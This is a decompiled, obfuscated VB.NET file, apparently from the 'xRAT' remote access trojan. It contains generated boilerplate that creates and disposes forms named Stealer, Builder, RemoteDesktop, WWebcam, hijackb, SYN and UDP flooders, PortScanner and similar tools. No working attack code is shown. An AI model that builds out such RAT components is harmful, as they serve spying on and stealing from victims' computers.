Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.ApplicationServices
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.CodeDom.Compiler
Imports System.Collections
Imports System.ComponentModel
Imports System.ComponentModel.Design
Imports System.Diagnostics
Imports System.Reflection
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports xRAT

<HideModuleName, StandardModule, GeneratedCode("MyTemplate", "8.0.0.0")> _
Friend NotInheritable Class Class2
    ' Methods
    Shared Sub New()
        Class1.QaIGh5M7cuigS
        Class2.class0_0 = New Class0(Of Class10)
        Class2.class0_1 = New Class0(Of Form0)
        Class2.class0_2 = New Class0(Of User)
        Class2.class0_3 = New Class0(Of Class4)
        Class2.class0_4 = New Class0(Of Class3)
    End Sub


    ' Properties
    <HelpKeyword("My.Computer")> _
    Friend Shared ReadOnly Property Class10_0 As Class10
        <DebuggerHidden> _
        Get
            Return Class2.class0_0.method_0
        End Get
    End Property

    <HelpKeyword("My.WebServices")> _
    Friend Shared ReadOnly Property Class3_0 As Class3
        <DebuggerHidden> _
        Get
            Return Class2.class0_4.method_0
        End Get
    End Property

    <HelpKeyword("My.Forms")> _
    Friend Shared ReadOnly Property Class4_0 As Class4
        <DebuggerHidden> _
        Get
            Return Class2.class0_3.method_0
        End Get
    End Property

    <HelpKeyword("My.Application")> _
    Friend Shared ReadOnly Property Form0_0 As Form0
        <DebuggerHidden> _
        Get
            Return Class2.class0_1.method_0
        End Get
    End Property

    <HelpKeyword("My.User")> _
    Friend Shared ReadOnly Property User_0 As User
        <DebuggerHidden> _
        Get
            Return Class2.class0_2.method_0
        End Get
    End Property


    ' Fields
    Private Shared ReadOnly class0_0 As Class0(Of Class10)
    Private Shared ReadOnly class0_1 As Class0(Of Form0)
    Private Shared ReadOnly class0_2 As Class0(Of User)
    Private Shared class0_3 As Class0(Of Class4)
    Private Shared ReadOnly class0_4 As Class0(Of Class3)

    ' Nested Types
    <ComVisible(False), EditorBrowsable(EditorBrowsableState.Never)> _
    Friend NotInheritable Class Class0(Of T As New)
        ' Methods
        <EditorBrowsable(EditorBrowsableState.Never), DebuggerHidden> _
        Public Sub New()
            Class1.QaIGh5M7cuigS
        End Sub

        <DebuggerHidden> _
        Friend Function method_0() As T
            If (Class0(Of T).gparam_0 Is Nothing) Then
                Class0(Of T).gparam_0 = Activator.CreateInstance(Of T)
            End If
            Return Class0(Of T).gparam_0
        End Function


        ' Fields
        <ThreadStatic, CompilerGenerated> _
        Private Shared gparam_0 As T
    End Class

    <EditorBrowsable(EditorBrowsableState.Never), MyGroupCollection("System.Web.Services.Protocols.SoapHttpClientProtocol", "Create__Instance__", "Dispose__Instance__", "")> _
    Friend NotInheritable Class Class3
        ' Methods
        <EditorBrowsable(EditorBrowsableState.Never), DebuggerHidden> _
        Public Sub New()
            Class1.QaIGh5M7cuigS
        End Sub

        <DebuggerHidden, EditorBrowsable(EditorBrowsableState.Never)> _
        Public Overrides Function Equals(ByVal obj As Object) As Boolean
            Return MyBase.Equals(RuntimeHelpers.GetObjectValue(obj))
        End Function

        <DebuggerHidden, EditorBrowsable(EditorBrowsableState.Never)> _
        Public Overrides Function GetHashCode() As Integer
            Return MyBase.GetHashCode
        End Function

        <DebuggerHidden, EditorBrowsable(EditorBrowsableState.Never)> _
        Friend Function method_0() As Type
            Return GetType(Class3)
        End Function

        <DebuggerHidden> _
        Private Sub method_1(Of T)(ByRef gparam_0 As T)
            gparam_0 = CType(Nothing, T)
        End Sub

        <DebuggerHidden> _
        Private Shared Function smethod_0(Of T As New)(ByVal instance As Object) As T
            If (DirectCast(instance, T) Is Nothing) Then
                Return Activator.CreateInstance(Of T)
            End If
            Return DirectCast(instance, T)
        End Function

        <DebuggerHidden, EditorBrowsable(EditorBrowsableState.Never)> _
        Public Overrides Function ToString() As String
            Return MyBase.ToString
        End Function

    End Class

    <MyGroupCollection("System.Windows.Forms.Form", "Create__Instance__", "Dispose__Instance__", "My.MyProject.Forms"), EditorBrowsable(EditorBrowsableState.Never)> _
    Friend NotInheritable Class Class4
        ' Methods
        <EditorBrowsable(EditorBrowsableState.Never), DebuggerHidden> _
        Public Sub New()
            Class1.QaIGh5M7cuigS
        End Sub

        <EditorBrowsable(EditorBrowsableState.Never)> _
        Public Overrides Function Equals(ByVal obj As Object) As Boolean
            Return MyBase.Equals(RuntimeHelpers.GetObjectValue(obj))
        End Function

        <EditorBrowsable(EditorBrowsableState.Never)> _
        Public Overrides Function GetHashCode() As Integer
            Return MyBase.GetHashCode
        End Function

        Public Sub kCxtdfSub(ByVal noip_0 As noip)
            If (Not noip_0 Is Me.object_14) Then
                If (Not noip_0 Is Nothing) Then
                    Throw New ArgumentException("Property can only be set to Nothing")
                End If
                Me.method_53(Of noip)(DirectCast(Me.object_14, noip))
            End If
        End Sub

        Public Function method_0() As Avast
            Me.object_0 = Class4.smethod_0(Of Avast)(Me.object_0)
            Return DirectCast(Me.object_0, Avast)
        End Function

        Public Function method_1() As bitcoinn
            Me.object_1 = Class4.smethod_0(Of bitcoinn)(Me.object_1)
            Return DirectCast(Me.object_1, bitcoinn)
        End Function

        Public Function method_10() As HTTP_F
            Me.object_10 = Class4.smethod_0(Of HTTP_F)(Me.object_10)
            Return DirectCast(Me.object_10, HTTP_F)
        End Function

        Public Function method_11() As ip
            Me.object_11 = Class4.smethod_0(Of ip)(Me.object_11)
            Return DirectCast(Me.object_11, ip)
        End Function

        Public Function method_12() As IP_Tracer
            Me.object_12 = Class4.smethod_0(Of IP_Tracer)(Me.object_12)
            Return DirectCast(Me.object_12, IP_Tracer)
        End Function

        Public Function method_13() As MSG
            Me.object_13 = Class4.smethod_0(Of MSG)(Me.object_13)
            Return DirectCast(Me.object_13, MSG)
        End Function

        Public Function method_14() As noip
            Me.object_14 = Class4.smethod_0(Of noip)(Me.object_14)
            Return DirectCast(Me.object_14, noip)
        End Function

        Public Function method_15() As notifyzone
            Me.object_15 = Class4.smethod_0(Of notifyzone)(Me.object_15)
            Return DirectCast(Me.object_15, notifyzone)
        End Function

        Public Function method_16() As OpenURL
            Me.object_16 = Class4.smethod_0(Of OpenURL)(Me.object_16)
            Return DirectCast(Me.object_16, OpenURL)
        End Function

        Public Function method_17() As PortScanner
            Me.object_17 = Class4.smethod_0(Of PortScanner)(Me.object_17)
            Return DirectCast(Me.object_17, PortScanner)
        End Function

        Public Function method_18() As Process
            Me.object_18 = Class4.smethod_0(Of Process)(Me.object_18)
            Return DirectCast(Me.object_18, Process)
        End Function

        Public Function method_19() As Processes
            Me.object_19 = Class4.smethod_0(Of Processes)(Me.object_19)
            Return DirectCast(Me.object_19, Processes)
        End Function

        Public Function method_2() As Builder
            Me.object_2 = Class4.smethod_0(Of Builder)(Me.object_2)
            Return DirectCast(Me.object_2, Builder)
        End Function

        Public Function method_20() As RemoteDesktop
            Me.object_20 = Class4.smethod_0(Of RemoteDesktop)(Me.object_20)
            Return DirectCast(Me.object_20, RemoteDesktop)
        End Function

        Public Function method_21() As Settings
            Me.object_21 = Class4.smethod_0(Of Settings)(Me.object_21)
            Return DirectCast(Me.object_21, Settings)
        End Function

        Public Function method_22() As Stealer
            Me.object_22 = Class4.smethod_0(Of Stealer)(Me.object_22)
            Return DirectCast(Me.object_22, Stealer)
        End Function

        Public Function method_23() As SYN
            Me.object_23 = Class4.smethod_0(Of SYN)(Me.object_23)
            Return DirectCast(Me.object_23, SYN)
        End Function

        Public Function method_24() As SysInfo
            Me.object_24 = Class4.smethod_0(Of SysInfo)(Me.object_24)
            Return DirectCast(Me.object_24, SysInfo)
        End Function

        Public Function method_25() As UDP
            Me.object_25 = Class4.smethod_0(Of UDP)(Me.object_25)
            Return DirectCast(Me.object_25, UDP)
        End Function

        Public Function method_26() As WWebcam
            Me.object_26 = Class4.smethod_0(Of WWebcam)(Me.object_26)
            Return DirectCast(Me.object_26, WWebcam)
        End Function

        Public Sub method_27(ByVal avast_0 As Avast)
            If (Not avast_0 Is Me.object_0) Then
                If (Not avast_0 Is Nothing) Then
                    Throw New ArgumentException("Property can only be set to Nothing")
                End If
                Me.method_53(Of Avast)(DirectCast(Me.object_0, Avast))
            End If
        End Sub

        Public Sub method_28(ByVal bitcoinn_0 As bitcoinn)
            If (Not bitcoinn_0 Is Me.object_1) Then
                If (Not bitcoinn_0 Is Nothing) Then
                    Throw New ArgumentException("Property can only be set to Nothing")
                End If
                Me.method_53(Of bitcoinn)(DirectCast(Me.object_1, bitcoinn))
            End If
        End Sub

        Public Sub method_29(ByVal builder_0 As Builder)
            If (Not builder_0 Is Me.object_2) Then
                If (Not builder_0 Is Nothing) Then
                    Throw New ArgumentException("Property can only be set to Nothing")
                End If
                Me.method_53(Of Builder)(DirectCast(Me.object_2, Builder))
            End If
        End Sub

        Public Function method_3() As Chat
            Me.object_3 = Class4.smethod_0(Of Chat)(Me.object_3)
            Return DirectCast(Me.object_3, Chat)
        End Function

        Public Sub method_30(ByVal chat_0 As Chat)
            If (Not chat_0 Is Me.object_3) Then
                If (Not chat_0 Is Nothing) Then
                    Throw New ArgumentException("Property can only be set to Nothing")
                End If
                Me.method_53(Of Chat)(DirectCast(Me.object_3, Chat))
            End If
        End Sub

        Public Sub method_31(ByVal dl_0 As DL)
            If (Not dl_0 Is Me.object_4) Then
                If (Not dl_0 Is Nothing) Then
                    Throw New ArgumentException("Property can only be set to Nothing")
                End If
                Me.method_53(Of DL)(DirectCast(Me.object_4, DL))
            End If
        End Sub

        Public Sub method_32(ByVal file_Manager_0 As File_Manager)
            If (Not file_Manager_0 Is Me.object_5) Then
                If (Not file_Manager_0 Is Nothing) Then
                    Throw New ArgumentException("Property can only be set to Nothing")
                End If
                Me.method_53(Of File_Manager)(DirectCast(Me.object_5, File_Manager))
            End If
        End Sub

        Public Sub method_33(ByVal form1_0 As Form1)
            If (Not form1_0 Is Me.object_6) Then
                If (Not form1_0 Is Nothing) Then
                    Throw New ArgumentException("Property can only be set to Nothing")
                End If
                Me.method_53(Of Form1)(DirectCast(Me.object_6, Form1))
            End If
        End Sub

        Public Sub method_34(ByVal form2_0 As Form2)
            If (Not form2_0 Is Me.object_7) Then
                If (Not form2_0 Is Nothing) Then
                    Throw New ArgumentException("Property can only be set to Nothing")
                End If
                Me.method_53(Of Form2)(DirectCast(Me.object_7, Form2))
            End If
        End Sub

        Public Sub method_35(ByVal frmListen_0 As FrmListen)
            If (Not frmListen_0 Is Me.object_8) Then
                If (Not frmListen_0 Is Nothing) Then
                    Throw New ArgumentException("Property can only be set to Nothing")
                End If
                Me.method_53(Of FrmListen)(DirectCast(Me.object_8, FrmListen))
            End If
        End Sub

        Public Sub method_36(ByVal hijackb_0 As hijackb)
            If (Not hijackb_0 Is Me.object_9) Then
                If (Not hijackb_0 Is Nothing) Then
                    Throw New ArgumentException("Property can only be set to Nothing")
                End If
                Me.method_53(Of hijackb)(DirectCast(Me.object_9, hijackb))
            End If
        End Sub

        Public Sub method_37(ByVal http_F_0 As HTTP_F)
            If (Not http_F_0 Is Me.object_10) Then
                If (Not http_F_0 Is Nothing) Then
                    Throw New ArgumentException("Property can only be set to Nothing")
                End If
                Me.method_53(Of HTTP_F)(DirectCast(Me.object_10, HTTP_F))
            End If
        End Sub

        Public Sub method_38(ByVal ip_0 As ip)
            If (Not ip_0 Is Me.object_11) Then
                If (Not ip_0 Is Nothing) Then
                    Throw New ArgumentException("Property can only be set to Nothing")
                End If
                Me.method_53(Of ip)(DirectCast(Me.object_11, ip))
            End If
        End Sub

        Public Sub method_39(ByVal ip_Tracer_0 As IP_Tracer)
            If (Not ip_Tracer_0 Is Me.object_12) Then
                If (Not ip_Tracer_0 Is Nothing) Then
                    Throw New ArgumentException("Property can only be set to Nothing")
                End If
                Me.method_53(Of IP_Tracer)(DirectCast(Me.object_12, IP_Tracer))
            End If
        End Sub

        Public Function method_4() As DL
            Me.object_4 = Class4.smethod_0(Of DL)(Me.object_4)
            Return DirectCast(Me.object_4, DL)
        End Function

        Public Sub method_40(ByVal msg_0 As MSG)
            If (Not msg_0 Is Me.object_13) Then
                If (Not msg_0 Is Nothing) Then
                    Throw New ArgumentException("Property can only be set to Nothing")
                End If
                Me.method_53(Of MSG)(DirectCast(Me.object_13, MSG))
            End If
        End Sub

        Public Sub method_41(ByVal notifyzone_0 As notifyzone)
            If (Not notifyzone_0 Is Me.object_15) Then
                If (Not notifyzone_0 Is Nothing) Then
                    Throw New ArgumentException("Property can only be set to Nothing")
                End If
                Me.method_53(Of notifyzone)(DirectCast(Me.object_15, notifyzone))
            End If
        End Sub

        Public Sub method_42(ByVal openURL_0 As OpenURL)
            If (Not openURL_0 Is Me.object_16) Then
                If (Not openURL_0 Is Nothing) Then
                    Throw New ArgumentException("Property can only be set to Nothing")
                End If
                Me.method_53(Of OpenURL)(DirectCast(Me.object_16, OpenURL))
            End If
        End Sub

        Public Sub method_43(ByVal portScanner_0 As PortScanner)
            If (Not portScanner_0 Is Me.object_17) Then
                If (Not portScanner_0 Is Nothing) Then
                    Throw New ArgumentException("Property can only be set to Nothing")
                End If
                Me.method_53(Of PortScanner)(DirectCast(Me.object_17, PortScanner))
            End If
        End Sub

        Public Sub method_44(ByVal process_0 As Process)
            If (Not process_0 Is Me.object_18) Then
                If (Not process_0 Is Nothing) Then
                    Throw New ArgumentException("Property can only be set to Nothing")
                End If
                Me.method_53(Of Process)(DirectCast(Me.object_18, Process))
            End If
        End Sub

        Public Sub method_45(ByVal processes_0 As Processes)
            If (Not processes_0 Is Me.object_19) Then
                If (Not processes_0 Is Nothing) Then
                    Throw New ArgumentException("Property can only be set to Nothing")
                End If
                Me.method_53(Of Processes)(DirectCast(Me.object_19, Processes))
            End If
        End Sub

        Public Sub method_46(ByVal remoteDesktop_0 As RemoteDesktop)
            If (Not remoteDesktop_0 Is Me.object_20) Then
                If (Not remoteDesktop_0 Is Nothing) Then
                    Throw New ArgumentException("Property can only be set to Nothing")
                End If
                Me.method_53(Of RemoteDesktop)(DirectCast(Me.object_20, RemoteDesktop))
            End If
        End Sub

        Public Sub method_47(ByVal settings_0 As Settings)
            If (Not settings_0 Is Me.object_21) Then
                If (Not settings_0 Is Nothing) Then
                    Throw New ArgumentException("Property can only be set to Nothing")
                End If
                Me.method_53(Of Settings)(DirectCast(Me.object_21, Settings))
            End If
        End Sub

        Public Sub method_48(ByVal stealer_0 As Stealer)
            If (Not stealer_0 Is Me.object_22) Then
                If (Not stealer_0 Is Nothing) Then
                    Throw New ArgumentException("Property can only be set to Nothing")
                End If
                Me.method_53(Of Stealer)(DirectCast(Me.object_22, Stealer))
            End If
        End Sub

        Public Sub method_49(ByVal syn_0 As SYN)
            If (Not syn_0 Is Me.object_23) Then
                If (Not syn_0 Is Nothing) Then
                    Throw New ArgumentException("Property can only be set to Nothing")
                End If
                Me.method_53(Of SYN)(DirectCast(Me.object_23, SYN))
            End If
        End Sub

        Public Function method_5() As File_Manager
            Me.object_5 = Class4.smethod_0(Of File_Manager)(Me.object_5)
            Return DirectCast(Me.object_5, File_Manager)
        End Function

        Public Sub method_50(ByVal sysInfo_0 As SysInfo)
            If (Not sysInfo_0 Is Me.object_24) Then
                If (Not sysInfo_0 Is Nothing) Then
                    Throw New ArgumentException("Property can only be set to Nothing")
                End If
                Me.method_53(Of SysInfo)(DirectCast(Me.object_24, SysInfo))
            End If
        End Sub

        Public Sub method_51(ByVal udp_0 As UDP)
            If (Not udp_0 Is Me.object_25) Then
                If (Not udp_0 Is Nothing) Then
                    Throw New ArgumentException("Property can only be set to Nothing")
                End If
                Me.method_53(Of UDP)(DirectCast(Me.object_25, UDP))
            End If
        End Sub

        Public Sub method_52(ByVal wwebcam_0 As WWebcam)
            If (Not wwebcam_0 Is Me.object_26) Then
                If (Not wwebcam_0 Is Nothing) Then
                    Throw New ArgumentException("Property can only be set to Nothing")
                End If
                Me.method_53(Of WWebcam)(DirectCast(Me.object_26, WWebcam))
            End If
        End Sub

        <DebuggerHidden> _
        Private Sub method_53(Of T As Form)(ByRef gparam_0 As T)
            gparam_0.Dispose
            gparam_0 = CType(Nothing, T)
        End Sub

        <EditorBrowsable(EditorBrowsableState.Never)> _
        Friend Function method_54() As Type
            Return GetType(Class4)
        End Function

        Public Function method_6() As Form1
            Me.object_6 = Class4.smethod_0(Of Form1)(Me.object_6)
            Return DirectCast(Me.object_6, Form1)
        End Function

        Public Function method_7() As Form2
            Me.object_7 = Class4.smethod_0(Of Form2)(Me.object_7)
            Return DirectCast(Me.object_7, Form2)
        End Function

        Public Function method_8() As FrmListen
            Me.object_8 = Class4.smethod_0(Of FrmListen)(Me.object_8)
            Return DirectCast(Me.object_8, FrmListen)
        End Function

        Public Function method_9() As hijackb
            Me.object_9 = Class4.smethod_0(Of hijackb)(Me.object_9)
            Return DirectCast(Me.object_9, hijackb)
        End Function

        <DebuggerHidden> _
        Private Shared Function smethod_0(Of T As { Form, New })(ByVal Instance As Object) As T
            Dim local As T
            If ((Not DirectCast(Instance, T) Is Nothing) AndAlso Not Instance.IsDisposed) Then
                Return DirectCast(Instance, T)
            End If
            If (Not Class4.hashtable_0 Is Nothing) Then
                If Class4.hashtable_0.ContainsKey(GetType(T)) Then
                    Throw New InvalidOperationException(Utils.GetResourceString("WinForms_RecursiveFormCreate", New String(0  - 1) {}))
                End If
            Else
                Class4.hashtable_0 = New Hashtable
            End If
            Class4.hashtable_0.Add(GetType(T), Nothing)
            Try 
                local = Activator.CreateInstance(Of T)
            Catch obj1 As Object When (?)
                Dim exception As TargetInvocationException
                Throw New InvalidOperationException(Utils.GetResourceString("WinForms_SeeInnerException", New String() { exception.InnerException.Message }), exception.InnerException)
            Finally
                Class4.hashtable_0.Remove(GetType(T))
            End Try
            Return local
        End Function

        <EditorBrowsable(EditorBrowsableState.Never)> _
        Public Overrides Function ToString() As String
            Return MyBase.ToString
        End Function


        ' Fields
        <ThreadStatic> _
        Private Shared hashtable_0 As Hashtable
        Public object_0 As Object
        Public object_1 As Object
        Public object_10 As Object
        Public object_11 As Object
        Public object_12 As Object
        Public object_13 As Object
        Public object_14 As Object
        Public object_15 As Object
        Public object_16 As Object
        Public object_17 As Object
        Public object_18 As Object
        Public object_19 As Object
        Public object_2 As Object
        Public object_20 As Object
        Public object_21 As Object
        Public object_22 As Object
        Public object_23 As Object
        Public object_24 As Object
        Public object_25 As Object
        Public object_26 As Object
        Public object_3 As Object
        Public object_4 As Object
        Public object_5 As Object
        Public object_6 As Object
        Public object_7 As Object
        Public object_8 As Object
        Public object_9 As Object
    End Class
End Class


